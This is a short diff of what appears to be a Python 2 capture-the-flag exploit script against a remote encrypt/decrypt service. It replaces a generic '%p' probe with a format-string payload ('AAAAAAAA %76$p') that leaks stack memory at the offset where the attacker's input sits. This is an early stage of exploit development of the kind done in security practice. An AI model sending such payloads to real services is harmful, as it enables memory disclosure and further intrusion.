@@ -95,12 +95,14 @@ def decrypt(ct):
     recvuntil('> ')
     return pt
 
+def run(text):
+    return decrypt( encrypt( text ) )
+
 def main():
     recvuntil('> ')
     setkey()
-    payload = '%p %p %p %p'
-    ct = encrypt(payload)
-    print decrypt(ct)
+    # %76$p es mi input
+    print run('AAAAAAAA %76$p')
 
 
 if __name__ == '__main__':
